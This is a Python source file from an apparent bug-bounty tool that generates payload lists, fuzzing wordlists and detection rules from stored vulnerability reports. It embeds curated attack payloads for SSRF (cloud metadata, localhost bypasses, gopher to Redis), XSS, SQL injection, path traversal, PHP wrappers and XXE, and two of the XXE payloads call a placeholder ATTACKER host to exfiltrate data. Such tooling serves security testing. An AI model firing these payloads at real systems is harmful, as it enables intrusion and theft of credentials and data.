"""Artifact generation - payloads, wordlists, and detection rules."""

import json
import logging
from pathlib import Path
from typing import List, Dict, Any, Optional
from collections import Counter

from core.storage import Storage
from .extractor import MetadataExtractor
from .patterns import PatternDetector


class ArtifactGenerator:
    """Generate payloads, wordlists, and detection rules from analyzed reports."""

    def __init__(self, storage: Storage, output_dir: str = "data"):
        self.storage = storage
        self.output_dir = Path(output_dir)
        self.extractor = MetadataExtractor()
        self.pattern_detector = PatternDetector(storage)
        self.logger = logging.getLogger("bugrecon.analyzer.generator")

    def generate_all(self, categories: Optional[List[str]] = None):
        """Generate all artifacts for specified categories."""
        if not categories:
            categories = ["ssrf", "xss", "sqli", "idor", "business_logic", "rce", "lfi", "xxe"]

        self.logger.info(f"Generating artifacts for categories: {categories}")

        for category in categories:
            self.logger.info(f"Processing category: {category}")
            reports = self.storage.search_reports(category=category, limit=1000)

            if not reports:
                self.logger.warning(f"No reports found for category: {category}")
                continue

            # Generate payloads
            self.generate_payloads(category, reports)

            # Generate wordlists
            self.generate_wordlist(category, reports)

            # Generate detection rules
            self.generate_detection_rules(category, reports)

        self.logger.info("Artifact generation complete")

    def generate_payloads(self, category: str, reports: List[Dict[str, Any]]) -> str:
        """Generate payload file for a category."""
        payloads = []
        seen_values = set()

        for report in reports:
            raw_data = report.get("raw_data", "") or json.dumps(report)
            extracted = self.extractor.extract_payloads(raw_data, category)

            for payload in extracted:
                value = payload.get("value", "")
                if value and value not in seen_values:
                    seen_values.add(value)
                    payloads.append({
                        "value": value,
                        "type": payload.get("type", "generic"),
                        "source": "extracted",
                        "category": category,
                        "bypass": self._is_bypass_payload(value),
                        "tags": self._tag_payload(value, category),
                    })

        # Add base payloads for the category
        base_payloads = self._get_base_payloads(category)
        for bp in base_payloads:
            if bp["value"] not in seen_values:
                payloads.append(bp)

        # Save payload file
        output_path = self.output_dir / "payloads" / f"{category}_payloads.json"
        output_path.parent.mkdir(parents=True, exist_ok=True)

        payload_data = {
            "category": category,
            "total_payloads": len(payloads),
            "generated_from": len(reports),
            "payloads": payloads,
        }

        with open(output_path, "w") as f:
            json.dump(payload_data, f, indent=2)

        self.logger.info(f"Generated {len(payloads)} payloads for {category} -> {output_path}")
        return str(output_path)

    def generate_wordlist(self, category: str, reports: List[Dict[str, Any]]) -> str:
        """Generate fuzzing wordlist for a category."""
        words = Counter()

        for report in reports:
            raw_data = report.get("raw_data", "") or json.dumps(report)

            # Extract parameters
            params = self.extractor.extract_parameters(raw_data)
            words.update(params)

            # Extract endpoints
            endpoints = self.extractor.extract_endpoints(raw_data)
            for ep in endpoints:
                # Split path segments
                segments = [s for s in ep.split('/') if s and not s.isdigit()]
                words.update(segments)

        # Build wordlist
        wordlist = [word for word, _ in words.most_common(500)]

        # Add category-specific words
        category_words = self._get_category_wordlist(category)
        for w in category_words:
            if w not in wordlist:
                wordlist.append(w)

        # Save wordlist
        output_path = self.output_dir / "wordlists" / f"{category}_wordlist.txt"
        output_path.parent.mkdir(parents=True, exist_ok=True)

        with open(output_path, "w") as f:
            f.write("\n".join(wordlist))

        self.logger.info(f"Generated wordlist ({len(wordlist)} words) for {category} -> {output_path}")
        return str(output_path)

    def generate_detection_rules(self, category: str, reports: List[Dict[str, Any]]) -> str:
        """Generate detection/matching rules for a category."""
        rules = self.pattern_detector.generate_detection_rules(reports)
        category_rules = rules.get(category, [])

        # Enrich with patterns found in reports
        bypass_methods = self.pattern_detector.aggregate_bypass_methods(reports)
        category_bypasses = bypass_methods.get(category, [])

        rule_data = {
            "category": category,
            "detection_rules": category_rules,
            "bypass_methods": category_bypasses,
            "total_reports_analyzed": len(reports),
        }

        output_path = self.output_dir / "rules" / f"{category}_rules.json"
        output_path.parent.mkdir(parents=True, exist_ok=True)

        with open(output_path, "w") as f:
            json.dump(rule_data, f, indent=2)

        self.logger.info(f"Generated detection rules for {category} -> {output_path}")
        return str(output_path)

    def _is_bypass_payload(self, value: str) -> bool:
        """Check if a payload is a bypass variant."""
        bypass_indicators = [
            '%25', '%00', '\\u', '0x', '/*', '*/',
            'char(', 'concat(', '\\x', '%0a', '%0d',
        ]
        return any(ind in value.lower() for ind in bypass_indicators)

    def _tag_payload(self, value: str, category: str) -> List[str]:
        """Auto-tag a payload based on its content."""
        tags = [category]

        tag_patterns = {
            "cloud-metadata": r'169\.254|metadata',
            "localhost": r'(?:127\.0\.0\.1|localhost|0\.0\.0\.0)',
            "internal-network": r'(?:10\.|172\.(?:1[6-9]|2\d|3[01])|192\.168)',
            "encoded": r'%[0-9a-fA-F]{2}',
            "unicode": r'\\u[0-9a-fA-F]',
            "bypass": r'(?:%25|%00|\\x|0x)',
            "blind": r'(?:sleep|benchmark|waitfor|oob|burp|collaborator)',
            "dom": r'(?:document\.|window\.|innerHTML)',
            "stored": r'(?:stored|persistent)',
            "time-based": r'(?:sleep|benchmark|waitfor|delay)',
            "error-based": r'(?:extractvalue|updatexml|floor\(rand)',
            "oob": r'(?:dns|http|burp|interact\.sh)',
        }

        for tag, pattern in tag_patterns.items():
            import re
            if re.search(pattern, value, re.I):
                tags.append(tag)

        return tags

    def _get_base_payloads(self, category: str) -> List[Dict[str, Any]]:
        """Get curated base payloads for a category."""
        base = {
            "ssrf": [
                {"value": "http://169.254.169.254/latest/meta-data/", "type": "cloud-metadata", "tags": ["aws", "metadata"]},
                {"value": "http://metadata.google.internal/computeMetadata/v1/", "type": "cloud-metadata", "tags": ["gcp", "metadata"]},
                {"value": "http://169.254.169.254/metadata/instance", "type": "cloud-metadata", "tags": ["azure", "metadata"]},
                {"value": "http://127.0.0.1/", "type": "localhost", "tags": ["basic"]},
                {"value": "http://localhost/", "type": "localhost", "tags": ["basic"]},
                {"value": "http://0.0.0.0/", "type": "localhost", "tags": ["basic"]},
                {"value": "http://[::1]/", "type": "localhost", "tags": ["ipv6"]},
                {"value": "http://0177.0.0.1/", "type": "localhost", "tags": ["bypass", "octal"]},
                {"value": "http://2130706433/", "type": "localhost", "tags": ["bypass", "decimal"]},
                {"value": "http://0x7f000001/", "type": "localhost", "tags": ["bypass", "hex"]},
                {"value": "gopher://127.0.0.1:6379/_", "type": "protocol-smuggling", "tags": ["redis", "gopher"]},
                {"value": "dict://127.0.0.1:6379/info", "type": "protocol-smuggling", "tags": ["redis", "dict"]},
                {"value": "file:///etc/passwd", "type": "file-read", "tags": ["linux"]},
            ],
            "xss": [
                {"value": "<script>alert(1)</script>", "type": "basic", "tags": ["script"]},
                {"value": "<img src=x onerror=alert(1)>", "type": "event-handler", "tags": ["img"]},
                {"value": "<svg onload=alert(1)>", "type": "event-handler", "tags": ["svg"]},
                {"value": "javascript:alert(1)", "type": "uri", "tags": ["javascript"]},
                {"value": "\"><script>alert(1)</script>", "type": "context-break", "tags": ["attribute"]},
                {"value": "'-alert(1)-'", "type": "context-break", "tags": ["js-context"]},
                {"value": "{{constructor.constructor('alert(1)')()}}", "type": "template", "tags": ["angular"]},
                {"value": "${alert(1)}", "type": "template", "tags": ["template-literal"]},
                {"value": "<iframe srcdoc='<script>alert(1)</script>'>", "type": "iframe", "tags": ["sandbox-bypass"]},
                {"value": "<details open ontoggle=alert(1)>", "type": "event-handler", "tags": ["html5"]},
            ],
            "sqli": [
                {"value": "' OR '1'='1", "type": "auth-bypass", "tags": ["basic"]},
                {"value": "' UNION SELECT NULL,NULL--", "type": "union", "tags": ["column-enum"]},
                {"value": "' AND SLEEP(5)--", "type": "time-based", "tags": ["blind"]},
                {"value": "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--", "type": "error-based", "tags": ["mysql"]},
                {"value": "1; WAITFOR DELAY '0:0:5'--", "type": "time-based", "tags": ["mssql"]},
                {"value": "' AND extractvalue(1,concat(0x7e,version()))--", "type": "error-based", "tags": ["mysql"]},
                {"value": "1' ORDER BY 1--", "type": "column-enum", "tags": ["basic"]},
                {"value": "admin'--", "type": "auth-bypass", "tags": ["login"]},
            ],
            "idor": [
                {"value": "/api/v1/users/{id}", "type": "endpoint", "tags": ["api", "user"]},
                {"value": "/api/v1/orders/{id}", "type": "endpoint", "tags": ["api", "order"]},
                {"value": "user_id=VICTIM_ID", "type": "parameter", "tags": ["horizontal"]},
                {"value": "role=admin", "type": "parameter", "tags": ["vertical", "privilege-escalation"]},
            ],
            "lfi": [
                {"value": "../../etc/passwd", "type": "path-traversal", "tags": ["linux"]},
                {"value": "....//....//etc/passwd", "type": "path-traversal", "tags": ["bypass", "filter"]},
                {"value": "php://filter/convert.base64-encode/resource=index.php", "type": "wrapper", "tags": ["php"]},
                {"value": "php://input", "type": "wrapper", "tags": ["php", "rce"]},
                {"value": "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==", "type": "wrapper", "tags": ["php"]},
                {"value": "/proc/self/environ", "type": "path-traversal", "tags": ["linux", "rce"]},
            ],
            "xxe": [
                {"value": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>', "type": "file-read", "tags": ["basic"]},
                {"value": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://ATTACKER/xxe">]><foo>&xxe;</foo>', "type": "oob", "tags": ["exfiltration"]},
                {"value": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://ATTACKER/evil.dtd">%xxe;]><foo>test</foo>', "type": "parameter-entity", "tags": ["blind"]},
            ],
        }

        category_payloads = base.get(category, [])
        for p in category_payloads:
            p["category"] = category
            p["source"] = "curated"
            p["bypass"] = "bypass" in p.get("tags", [])

        return category_payloads

    def _get_category_wordlist(self, category: str) -> List[str]:
        """Get base wordlist for a category."""
        wordlists = {
            "ssrf": [
                "url", "uri", "path", "dest", "redirect", "callback", "next",
                "target", "rurl", "return", "link", "image", "img", "fetch",
                "proxy", "webhook", "forward", "goto", "domain", "feed",
                "host", "site", "html", "pdf", "import", "export", "preview",
                "avatar", "logo", "icon", "screenshot", "thumbnail", "embed",
            ],
            "xss": [
                "q", "search", "query", "keyword", "term", "name", "username",
                "email", "comment", "message", "body", "title", "description",
                "content", "text", "value", "input", "data", "bio", "about",
                "label", "subject", "url", "redirect_uri", "return_url",
                "callback", "next", "ref", "page", "view", "template",
            ],
            "sqli": [
                "id", "user_id", "item_id", "order_id", "cat", "category",
                "dir", "sort", "order", "limit", "offset", "page", "search",
                "q", "query", "filter", "where", "column", "field", "table",
                "report", "role", "group", "date", "year", "month",
            ],
            "idor": [
                "id", "uid", "user_id", "account_id", "order_id", "file_id",
                "doc_id", "invoice_id", "ref", "reference", "number", "num",
                "uuid", "guid", "token", "key", "hash", "slug", "handle",
                "profile_id", "customer_id", "organization_id", "team_id",
            ],
            "business_logic": [
                "price", "amount", "total", "quantity", "qty", "discount",
                "coupon", "code", "promo", "referral", "credits", "balance",
                "limit", "max", "min", "count", "rate", "frequency",
                "role", "permission", "admin", "status", "state", "step",
            ],
            "lfi": [
                "file", "path", "page", "template", "include", "require",
                "read", "load", "open", "dir", "document", "folder",
                "root", "pg", "style", "pdf", "img", "lang", "locale",
            ],
        }

        return wordlists.get(category, [])
